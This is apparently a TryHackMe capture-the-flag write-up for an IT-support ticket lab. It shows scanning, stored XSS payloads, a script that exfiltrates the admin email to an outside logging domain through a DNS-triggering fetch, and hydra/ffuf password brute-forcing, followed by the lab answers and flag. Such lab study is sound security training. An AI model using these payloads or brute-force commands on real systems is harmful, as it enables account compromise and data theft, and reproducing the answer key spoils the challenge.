----
IT Support are going to have a bad day, can you get into the admin account?
----

![](https://assets.tryhackme.com/additional/thatstheticket/banner.png)

### Task 1  Lab Information

 Start Machine

IT Support is going to have a really bad day today, but don't think they're stupid! They have really strict firewalls!  

Using the IT support portal try and make your way into the admin account.

**Hint:** Our HTTP & DNS Logging tool on [http://10.10.10.100](http://10.10.10.100/) may come in useful!  

  

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.84.149 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.84.149:22
Open 10.10.84.149:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-28 14:13 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:13
Completed NSE at 14:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:13
Completed NSE at 14:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:13
Completed NSE at 14:13, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 14:13
Completed Parallel DNS resolution of 1 host. at 14:13, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 14:13
Scanning 10.10.84.149 [2 ports]
Discovered open port 22/tcp on 10.10.84.149
Discovered open port 80/tcp on 10.10.84.149
Completed Connect Scan at 14:13, 0.18s elapsed (2 total ports)
Initiating Service scan at 14:13
Scanning 2 services on 10.10.84.149
Completed Service scan at 14:13, 8.02s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.84.149.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:13
Completed NSE at 14:13, 8.50s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:13
Completed NSE at 14:13, 0.91s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:13
Completed NSE at 14:13, 0.00s elapsed
Nmap scan report for 10.10.84.149
Host is up, received user-set (0.18s latency).
Scanned at 2023-07-28 14:13:26 EDT for 18s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bfc39c992cc4e2d92033d13cdc0148d2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8dfacBZcXm48CzKZh1Vd6tO6p86sR7PyBbxJj9q9Zifzlq+GmD+r1eXLaH+waOWnD/fmPr8CtScSVP0iu0opnIZ21A4Zy/SOjNKVuDWGWP36cj/XxiTlLL3qfOk0OXy/xVEYycYWhiJm1VLhOSg5Tk3xGGJRBY9V1MfBF/Oq2DdEcODzUnh/JLikJctZ15DwGTaY+6ehl6Kh1PwRQ6XZmhLP42P9NtPCY8AkXCO2EJrE/tzckhUzi4vr17Z0M4zZd8AZX1SfX3t5hULhKMDbQ7zRQNTIeaLYdPBa4Yu3Ze2annUvOlKhnTKm+omW7vbXKWurIWRqyG59F12sNHl3P
|   256 0820c273c7c5d7a7ef020911fc85a8e2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO1cxZc0WJgiYCd7m7sxzMYbgVLjqIc40ZZi4Y+M+YHJeISCq1bhTMLSpIWHxwpnQg+qVD3wrgYWI9Hr6FGGMrg=
|   256 1f51682b5e99574cb740150574d00d9b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFCYrvmQ5DCiI8ZbvzVWWIkj1apQr36j4vJ8K8MfUCKz
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Ticket Manager > Home
| http-methods: 
|_  Supported Methods: GET HEAD POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:13
Completed NSE at 14:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:13
Completed NSE at 14:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:13
Completed NSE at 14:13, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.52 seconds

┌──(root㉿kali)-[/home/witty/Downloads]
└─# dirsearch -u http://10.10.84.149/ -i200,301,302,401

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/.dirsearch/reports/10.10.84.149/-_23-07-28_14-13-44.txt

Error Log: /root/.dirsearch/logs/errors-23-07-28_14-13-44.log

Target: http://10.10.84.149/

[14:13:45] Starting: 
[14:15:40] 200 -    2KB - /login
[14:15:41] 200 -    2KB - /login/
[14:15:42] 302 -    0B  - /logout  ->  /
[14:15:42] 302 -    0B  - /logout/  ->  /
[14:16:11] 200 -    2KB - /register



after registering
XSS
<div><textarea name="message" class="form-control" style="height: 200px;"></textarea></div>

</textarea><script>alert(1)</script>

http://10.10.10.100/

The TryHackMe request catcher creates a unique URL that you can use on the TryHackMe private network for logging HTTP and DNS requests from your target, perfect for various blind Attacks!

TryHackMe Request Catcher
Listening for requests for the below domain
91ee648a9ea9692fd1ff90be789f3e44.log.tryhackme.tech
As long as the domain ends in 91ee648a9ea9692fd1ff90be789f3e44.log.tryhackme.tech you can catch other domain results for example:

    str91ee648a9ea9692fd1ff90be789f3e44.log.tryhackme.tech
    str-91ee648a9ea9692fd1ff90be789f3e44.log.tryhackme.tech
    str.91ee648a9ea9692fd1ff90be789f3e44.log.tryhackme.tech
    str.str.91ee648a9ea9692fd1ff90be789f3e44.log.tryhackme.tech

</textarea>
<img src="http://91ee648a9ea9692fd1ff90be789f3e44.log.tryhackme.tech">
<textarea>

We received a DNS lookup with type: AAAA for the domain:
91ee648a9ea9692fd1ff90be789f3e44.log.tryhackme.tech

The Lookup was requested @ 28 Jul 2023 14:20:25 UTC from IP 200.48.79.81

We received the following HTTP Request:
----------------------------------------------------------------------------------

GET / HTTP/1.1
Host: 91ee648a9ea9692fd1ff90be789f3e44.log.tryhackme.tech
Referer: http://10.10.84.149/
Connection: close
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.5
Accept: image/avif,image/webp,*/*
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0


----------------------------------------------------------------------------------
Request received @ 28 Jul 2023 14:20:25 UTC from IP 10.8.19.103

Exploiting DNS lookups

- We can fetch email from the innerHTML of the `email` DOM element.
    

- And then append the email as a subdomain. (Classic DNS exfiltration)!
    
    - **NOTE:** We need to replace the `@` and `.` characters in the email.

</textarea>
<script>
var email = document.getElementById("email").innerHTML;
email = email.replace('@', 'A');
email = email.replace('.', 'B');
fetch('http://'+ email + '.91ee648a9ea9692fd1ff90be789f3e44.log.tryhackme.tech');
</script>
<textarea>

We received a DNS lookup with type: A for the domain:
adminaccountaitsupportbthm.91ee648a9ea9692fd1ff90be789f3e44.log.tryhackme.tech

The Lookup was requested @ 28 Jul 2023 14:29:16 UTC from IP 3.251.105.190

adminaccount@itsupport.thm

Invalid email / password combination

https://www.manrajbansal.com/post/how-to-use-hydra-to-brute-force-login-forms

hydra -l 'adminaccount@itsupport.thm' -P /usr/share/wordlists/rockyou.txt 10.10.84.149 http-post-form "/login:email=^USER^&password=^PASS^&Login=Login:Invalid email / password combination" -V

or


:: Progress: [2036/14344392] :: Job [1/1] :: 161 req/sec :: Duration: [0:00:14] :::: Progress: [2037/14344392] :: Job [1/1] :: 161 req/sec :: Duration: [0:00:14] ::[Status: 401, Size: 1697, Words: 475, Lines: 41, Duration: 271ms]
    * FUZZ: virgo

:: Progress: [2037/14344392] :: Job [1/1] :: 161 req/sec :: Duration: [0:00:14] ::[Status: 401, Size: 1697, Words: 475, Lines: 41, Duration: 272ms]
    * FUZZ: loveable

┌──(witty㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/rockyou.txt  -d "email=adminaccount@itsupport.thm&password=FUZZ" -u http://10.10.84.149/login -fw 475 -H "Content-Type: application/x-www-form-urlencoded"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.84.149/login
 :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : email=adminaccount@itsupport.thm&password=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response words: 475
________________________________________________

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 403ms]
    * FUZZ: 123123

[80][http-post-form] host: 10.10.84.149   login: adminaccount@itsupport.thm   password: 123123
1 of 1 target successfully completed, 1 valid password found

login

ID 1

Hey, can you change my password to THM{6804f45260135ec8418da2d906328473}

```

What is IT Supports email address?  

*adminaccount@itsupport.thm*

Admin users password  

*123123*

Flag inside Ticket 1

*THM{6804f45260135ec8418da2d906328473}*


[[Busqueda]]